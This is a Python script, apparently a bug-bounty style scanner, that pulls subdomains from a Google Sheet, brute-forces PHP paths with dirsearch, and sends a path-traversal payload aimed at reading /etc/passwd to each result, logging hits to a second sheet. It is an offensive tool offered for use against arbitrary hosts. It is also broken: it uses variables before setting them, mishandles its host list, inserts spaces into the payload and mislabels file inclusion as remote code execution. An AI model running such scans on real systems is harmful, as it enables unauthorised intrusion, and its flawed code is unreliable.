import os 
import requests
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow

SCOPES = [
    'https://www.googleapis.com/auth/drive',
    'https://www.googleapis.com/auth/drive.file'
    ]
SPREADSHEET_ID = '1EckNrafKPr6TMTnLorrqjIkwgwtFjAMT396pbvBLKAo'
GET_SUBDOMAIN_RANGE = 'results!A2:A174'
creds = None
# Retrieves data from Google Sheet with any given range
def getData(service, range):
    sheet = service.spreadsheets()
    result = sheet.values().get(spreadsheetId=SPREADSHEET_ID,
                                range=range,
                                valueRenderOption='FORMATTED_VALUE').execute()
    values = result.get('values', [])

    if not values:
        print('Cannot retreive data. No data found.')
        quit()

    return values

def value(SCOPES, GET_SUBDOMAIN_RANGE, getData):
    if os.path.exists('token.json'):
            creds = Credentials.from_authorized_user_file('token.json', SCOPES)

    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
            'credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)

        with open('token.json', 'w') as token:
            token.write(creds.to_json())

    service = build('sheets', 'v4', credentials=creds)
    values = getData(service, GET_SUBDOMAIN_RANGE)
    return values

values = value(SCOPES, GET_SUBDOMAIN_RANGE, getData)
hosts = values

try:
    os.system('python .\dirsearch\dirsearch.py -e php -u '+hosts+' --exclude-status 201-999 --output=out.txt --format=plain')
    
    X = open('out.txt','r').read().splitlines()
    for i in X:
        payload = ("? page = .. / .. / .. / .. / .. / .. / etc / passwd")
        request = requests.get(i+payload)
        print("The domain name : ",i)
        print("payload used : ",payload)
        r = request.status_code

        if r == 200:
            ans = ("The subdomain is Vulnerable to the Remote code execution attack !!!!!")
            print(ans)
            print("#"*30)
        else:
            ans = ("The domain is not vulnerable!")
            print(ans)
            print("#"*30)

        # Set up the Sheets API client
        scopes = ['https://www.googleapis.com/auth/spreadsheets']
        creds = Credentials.from_authorized_user_file('token.json', scopes)
        service = build('sheets', 'v4', credentials=creds)
        # Define the data to be inserted
        values = [i]

        # Insert the data into the sheet
        result = service.spreadsheets().values().append(
            spreadsheetId='1vcKk2KQ6zAJFblxmht78QFIQu77KkV4Bpug765P-EWg',
            range='LFI!A2',
            valueInputOption='RAW',
            insertDataOption='INSERT_ROWS',
            body={'values': values}
        ).execute()
except KeyboardInterrupt:
    print('Quiting')
    quit()
